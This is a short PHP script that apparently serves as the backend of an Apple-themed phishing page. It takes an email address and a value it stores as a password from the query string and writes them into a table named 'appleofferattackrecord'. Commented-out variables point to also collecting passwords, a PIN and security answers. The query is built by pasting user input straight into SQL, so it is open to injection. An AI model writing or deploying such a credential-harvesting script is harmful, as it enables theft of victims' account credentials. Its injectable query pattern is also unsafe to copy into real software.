<?php

require 'conn.php';


$emailid = htmlspecialchars($_GET['emailid']);
$phno = htmlspecialchars($_GET['phno']);


// $emp = 'inserting';
// $currentpassword = 'inserting';
// $newpassword = 'inserting';
// $reenterpassword = 'inserting';
// $searchpin = 'inserting';
// $searchquestion = 'inserting';
// $answer = 'inserting';


$sql = "insert into appleofferattackrecord (email,password)
        values('$emailid','$phno'); ";
$result = mysqli_query($mysqli, $sql);
